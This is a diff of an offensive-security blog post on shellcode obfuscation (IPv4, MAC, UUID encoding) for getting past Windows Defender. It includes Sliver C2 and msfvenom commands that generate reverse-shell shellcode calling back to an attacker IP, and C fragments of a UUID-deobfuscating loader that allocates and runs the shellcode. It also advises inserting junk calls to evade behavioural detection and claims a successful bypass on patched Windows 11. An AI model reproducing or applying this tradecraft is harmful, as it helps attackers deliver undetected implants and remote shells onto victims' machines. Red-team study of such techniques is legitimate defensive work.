@@ -1,5 +1,5 @@
 ---
-title: Offensive C & Nim - Shellcode Obfuscation
+title: Offensive C - Shellcode Obfuscation
 author: nirajkharel
 date: 2025-05-24 14:10:00 +0800
 categories: [Red Teaming, Offensive Programming]
@@ -9,23 +9,23 @@ render_with_liquid: false
 
 
 ## Shellcode
-We have already discussed about [process injection using shellcode](https://nirajkharel.com.np/posts/process-injection-shellcode/) which pretty much explains about the shellcode, why and how to use it.
+We have already discussed about [process injection using shellcode](https://nirajkharel.com.np/posts/process-injection-shellcode/) which pretty much explains about why and how to use it.
 
-Giving the background again, shellcode is just a collection of instructions within the windows system which executes the command inorder to take a control or generates the reverse shell connection to an attacker machine. Below is a simple example of generating windows reverse tcp payload/shellcode which is obviously detected easily by Windows Defender.
+Giving the background again, shellcode is just a collection of instructions within the Windows system which executes the command in order to take control or generate a reverse shell connection to an attacker's machine. Below is a simple example of generating a Windows reverse TCP payload/shellcode, which is obviously detected easily by Windows Defender.
 
 <img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-1.png">
 
 ## Shellcode Obfuscation
-There are usually two types of techniques to bypass Defender detection which are Encryption and Obfuscation. In this module, we will be focusing on different types of Shellcode Obsufcation.
+There are usually two types of techniques to bypass Defender detection, Encryption and Obfuscation. In this module, we will be focusing on different types of shellcode obfuscation.
 
-Obfuscation is just a technique to transfer or modify the raw shellcode into different forms which are harder to detect or analyze. There are various types of Obfuscation techniques such as IPv4/IPv6, MAC and UUID Obfuscations.
+Obfuscation is a technique used to transform or modify raw shellcode into different forms that are harder to detect or analyze. There are various types of obfuscation techniques such as IPv4/IPv6, MAC, and UUID obfuscations.
 
 ### IPv4/IPv6 Obfuscation 
-IPv4/IPv6 Obfuscation generally consists of a technique which converts the raw shellcode into IPv4 or IPV6 style syntax. 
+IPv4/IPv6 Obfuscation generally consists of a technique which converts the raw shellcode into IPv4 or IPV6 style format. 
 
 IPv4Fuscation converts each byte of the shellcode to their corresnponding octets. Since IPv4 address contains 4 octets `192.168.1.0`, IPv4 obfuscation converts each byte of the shellcode into each octet of the IPv4 by converting the bytes in hex into the decimal.
 
-Example: For this chunk of the raw payload `"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"`, IPv4 slipts it into 4-byte chucnks to form IPv4 addresses. It first divides them into 4-byte groups as shown below:
+Example: For this chunk of the raw payload `"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"`, IPv4 slipts it into 4-byte chunks to form IPv4 addresses. It first divides them into 4-byte groups as shown below:
 
 ```
 \xfc \x48 \x83 \xe4
@@ -44,10 +44,10 @@ And then convers each byte into the decimal format, which results in:
 
 And then finally it is organised into IPv4 addresses:
 ```
-252.72.131.228
-240.232.204.0
-0.0.65.81
-65.80.0.0
+252.72.131.228  
+232.204.0.0  
+0.65.81.65  
+80.0.0.0  
 ```
 
 This is how you can get your shellcode/payload obfuscated into IPv4 formats.
@@ -57,27 +57,29 @@ You can refer to this [blog from Kylerosario](https://www.kylerosario.com/blog/I
 Below is an example which shows how we can use a tool like Supernova to obfuscate the payload.
 <img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-2.png">
 
-Similar technique can be used on IPv6Fuscation where the shellcodes are grouped into 16 bytes to generated one IPv6 address. Again for the detailed explanation, you can navigate to Kylerosario blog. Since IPv6 addresses are expressed in hexadecimal, converting it into decimal is not needed.
+A similar technique can be used in IPv6Fuscation, where the shellcode is grouped into 16 bytes to generate one IPv6 address. Again, for a detailed explanation, you can refer to Kylerosario's blog. Since IPv6 addresses are expressed in hexadecimal, converting them into decimal is not necessary.
 <img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-3.png">
 
 ### MACFuscation
-MACFuscation consists of the techqniue of converting raw shellcode into MAC addresses `aa:bb:cc:dd:ee:ff`. Each `aa, bb` represents one byte in hexadecimal. Since a typical MAC address contains 6 bytes, therefore the shellcode is grouped into 6 bytes and then converted into the MAC addresses. If its not the multiple of 6 bytes, padding is used on it.
+MACFuscation consists of the techqniue for converting raw shellcode into MAC addresses `aa:bb:cc:dd:ee:ff`. Each `aa, bb` represents one byte in hexadecimal. Since a typical MAC address contains 6 bytes, therefore the shellcode is grouped into 6 bytes and then converted into the MAC addresses. If its not the multiple of 6 bytes, padding is used.
 
-We can use the same tool to convert our shellcode into MAC address.
+We can use the same tool to convert our shellcode into MAC address format.
 <img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-4.png">
 
 ### UUIDFuscation
 UUIDFuscation is a technique to obfuscate raw shellcode into UUID format `550e8400-e29b-41d4-a716-446655440000`. The raw shellcode is grouped into 16 bytes chunks as each UUID represents 16 bytes. When the shellcode is not muliple of 16, padding can bse used.
 <img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-5.png">
 
-Since now we have explored at least 3 types of obfuscation techniques, lets move towards a practical demonstrations. But before that one important thing to understand and required is that we need to deobfuscate the payload as well. The **deobfuscation** is usually done before allocating the shellcode into virtual memory. We will explore one of the technique of **deobfuscation** on the demonstration itself.
+Since we have now explored at least three types of obfuscation techniques, let's move towards a practical demonstration. But before that, one important thing to understand is that we need to **deobfuscate** the payload as well. 
+
+**Deobfuscation** is usually done before allocating the shellcode into virtual memory. We will explore one of the techniques of **deobfuscation** during the demonstration itself.
 
 ## Sliver Shellcode Generation
 The first step for the demonstration would be to create a shellcode. We will be using **Sliver C2** to create a shellcode and listen for the callback.
 
 Setting up Sliver C2 is outside of this blog's objective. However, you can simply setup the Sliver C2 server and client following the [offical documentation of Sliver](https://sliver.sh/docs?name=Getting+Started).
 
-Once you have your sliver client ready and up running. Create a profile using below command:
+Once you have your sliver client ready and up running, create a profile using below command:
 ```bash
 profiles new beacon --mtls 192.168.1.86:443 --format shellcode shellcode-beacon
 ```
@@ -93,7 +95,8 @@ mtls -L 192.168.1.86 -l 443
 
 The victim machine runs stager delivered through port 8080, receives the beacon shellcode and connects back via mTLS.
 
-We can either use sliver **generate stager** command or msfvenom to generate our shellcode. For sliver stagers, it just call the msfvenom APIs, so there would be no difference on the shellcode.   
+We can either use Sliver's **generate stager** command or `msfvenom` to generate our shellcode. For Sliver stagers, it simply calls the `msfvenom` APIs, so there would be no difference in the generated shellcode.
+   
 **Using Sliver**
 ```bash
 generate stager --lhost 192.168.1.86 --lport 8080 --protocol http --save /tmp
@@ -110,7 +113,8 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.86 LPORT=8080 -f
 ```
 <img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-9.png">
 
-But as we have already mentioned earlier that we need to deobfuscate the payload as well. Using the tools like HellShell would be much easier on this case, since it not only provides the obfuscated code, but also provides a code block inorder to deobfuscate it. So, once we transfer the payload on our Windows attacker machine, we can use HellShell to obsucate it. Make sure to compile the HellShell on **Release** otherwise it would give some errors.
+But as we have already mentioned earlier, we need to deobfuscate the payload as well. Using tools like **HellShell** would be much easier in this case, since it not only provides the obfuscated code but also includes a code block to deobfuscate it. So, once we transfer the payload to our Windows attacker machine, we can use HellShell to obfuscate it. Make sure to compile HellShell in **Release** mode; otherwise, it may produce some errors.
+
 <img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-10.png">
 
 Until now, we have everything ready to listen and wait for the connection on the C2 side. Now lets talk about the deobfuscation of the payload. The below code is the output of HellShell which contains a function **UuidDeobfuscation whose** return type is BOOL. 
@@ -163,7 +167,7 @@ The code below loads **UuidFromStringA** method from **RPCRT4.dll** which is res
         }
  ```
 
-The next step would be to calculating the original size of the shellcode and allocating a memory for containing the deobfuscated shellcode. Here since each UUID is 16 bytes, the total number of buffer needed to be allocated is **16 * NmbfOfElements**. Just think it as an storage for the deobfuscated code.
+The next step would be to calculate the original size of the shellcode and allocate a memory for containing the deobfuscated shellcode. Here since each UUID is 16 bytes, the total number of buffer needed to be allocated is **16 * NmbfOfElements**. Just think of it as a storage for the deobfuscated code.
 
  ```c       
         // getting the real size of the shellcode (number of elements * 16 => original shellcode size)
@@ -268,7 +272,7 @@ Once the shellcode has been written into the buffer, we can execute that shellco
 }
 ```
 
-**Note:** Remember to insert some random methods withiin each of the above steps. This will help us to break the attack chain and can potentially bypass the Behavioural detection capabilities of the Windows Defender. For this demonstration, the below method for enumerating the username of the current machine has been inserted between each of the steps.  
+**Note:** Remember to insert some random methods within each of the above steps. This will help us break the attack chain and potentially bypass the behavioral detection capabilities of Windows Defender. For this demonstration, the method below for enumerating the username of the current machine has been inserted between each of the steps.
 
 ```c
         // Breaking attack chain
@@ -459,8 +463,6 @@ Using ThreatCheck to verify if it identifies any signatures based on the Windows
 Execute the payload on the completely patched Windows 11 machine and observe that were are able to successfully bypass Windows Defender and Real Time Protection and eventually were able to get the beacon on the C2 server.
 <img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-13.png">
 
-
-## Obfuscation using Nim
 
 #### References
 - [https://maldevacademy.com/](https://maldevacademy.com/)
